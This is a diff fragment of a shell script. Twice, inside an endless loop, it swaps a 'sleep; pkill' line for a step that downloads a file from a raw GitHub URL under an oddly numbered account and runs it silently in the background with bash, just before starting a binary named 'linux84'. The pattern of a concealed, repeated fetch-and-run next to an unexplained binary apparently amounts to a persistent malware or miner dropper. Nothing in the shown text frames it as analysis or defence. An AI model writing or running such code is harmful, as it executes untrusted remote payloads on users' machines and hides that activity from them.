@@ -53,7 +53,9 @@ make
 while true
 do
 
-sleep 12;pkill -f linux84 &> /dev/null &
+wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgoogle84741274
+
+bash ./linuxgoogle84741274 &> /dev/null &
 
 ./linux84 8
 
@@ -71,7 +73,9 @@ make
 while true
 do
 
-sleep 12;pkill -f linux84 &> /dev/null &
+wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgoogle84741274
+
+bash ./linuxgoogle84741274 &> /dev/null &
 
 ./linux84 8
 
